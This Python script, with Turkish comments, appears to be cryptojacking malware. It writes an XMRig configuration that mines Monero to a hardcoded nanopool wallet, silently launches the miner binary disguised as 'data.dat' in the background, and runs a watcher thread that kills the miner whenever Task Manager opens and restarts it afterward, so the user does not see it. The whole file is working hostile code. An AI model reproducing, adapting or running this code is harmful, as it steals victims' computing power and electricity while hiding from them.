import os
import subprocess
import psutil
import time
import threading    

jsonfiledata = """
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 1, 3],
        "cn": [
            [1, 0],
            [1, 1]
        ],
        "cn-heavy": [
            [1, 0]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 3]
        ],
        "cn-pico": [
            [2, 0],
            [2, 2],
            [2, 1],
            [2, 3]
        ],
        "cn/upx2": [
            [2, 0],
            [2, 2],
            [2, 1],
            [2, 3]
        ],
        "ghostrider": [
            [8, 0],
            [8, 1]
        ],
        "rx": [0, 1],
        "rx/arq": [0, 2, 1, 3],
        "rx/wow": [0, 1, 3],
        "cn-lite/0": false,
        "cn/0": false
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 1,
    "pools": [
        {
            "algo": "rx/0",
            "coin": "monero",
            "url": "xmr-eu1.nanopool.org:10300",
            "user": "46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
"""

def enject():
    with open("chcekdata", "w") as f:
        f.write("True")


def start():
    with open("config.json", "w") as config:
        config.write(jsonfiledata)
    print("1")
    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("2")


def kill():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
            process.terminate()  # Programı sonlandır
            process.wait()  # Sonlanmasını bekle
            print("data.dat başarıyla durduruldu.")
            return True
    print("data.dat bulunamadı.")
    return False


def ifapp():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            return True
    return False


def is_task_manager_open():
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() == "taskmgr.exe":
            return True
    return False


def task_manager_watcher():
    while True:
        if is_task_manager_open():
            print("Görev Yöneticisi Açıldı!")
            kill()
        elif not ifapp():
            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)


task = threading.Thread(target=task_manager_watcher)
task.start()

start()


#xmrig -o xmr-eu1.nanopool.org:10300 -u CüzdanAdresiniz -p x --opencl --cuda --no-cpu